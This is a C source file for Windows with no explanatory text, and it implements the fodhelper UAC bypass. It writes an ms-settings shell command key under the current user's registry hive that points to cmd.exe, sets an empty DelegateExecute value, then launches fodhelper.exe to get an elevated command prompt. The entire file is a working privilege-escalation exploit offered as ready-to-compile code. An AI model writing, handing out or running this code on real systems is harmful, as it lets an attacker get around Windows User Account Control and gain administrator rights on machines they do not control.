#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
// Function to print error messages
void PrintError(const char* msg)
{
    DWORD error = GetLastError();
    LPVOID errorMsg;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        error,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR) &errorMsg,
        0, NULL );

    printf("%s. Error %d: %s\n", msg, error, (char*)errorMsg);
    LocalFree(errorMsg);
}

int main()
{
    HKEY hKey;
    DWORD disposition;
    const char* settings = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const char* cmd = "C:\\Windows\\System32\\cmd.exe";

    printf("Creating registry key...\n");

    LSTATUS status = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)settings, 0, NULL, 0, KEY_WRITE, NULL, &hKey, &disposition);
    printf(status != ERROR_SUCCESS ? "Failed to open or create the registry key.\n" : "Successfully created the registry key.\n");

    printf("Setting registry value...\n");
    if (RegSetValueEx(hKey, "", 0, REG_SZ, (BYTE*)cmd, strlen(cmd)) != ERROR_SUCCESS) // or RegSetValueExA
    {
        PrintError("Failed to set registry value");
        RegCloseKey(hKey);
        return 1;
    }
    printf("Registry value set successfully.\n");

    printf("Setting DelegateExecute registry value...\n");
    if (RegSetValueEx(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1) != ERROR_SUCCESS) 
    {
        PrintError("Failed to set DelegateExecute registry value");
        RegCloseKey(hKey);
        return 1;
    }
    printf("DelegateExecute registry value set successfully.\n");

    RegCloseKey(hKey);
    printf("Registry key closed.\n");

    SHELLEXECUTEINFO shellExecuteInfo = { sizeof(shellExecuteInfo) };
    shellExecuteInfo.lpVerb = "runas";
    shellExecuteInfo.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
    shellExecuteInfo.hwnd = NULL;
    shellExecuteInfo.nShow = SW_NORMAL;

    printf("Executing fodhelper.exe...\n");
    if (!ShellExecuteEx(&shellExecuteInfo))
    {
        DWORD error = GetLastError();
        if (error == ERROR_CANCELLED)
        {
            printf("The user refused to allow privilege elevation.\n");
        }
        else
        {
            PrintError("Failed to execute fodhelper.exe");
        }
        return 1;
    }
    printf("fodhelper.exe executed successfully.\n");
    return 0;
}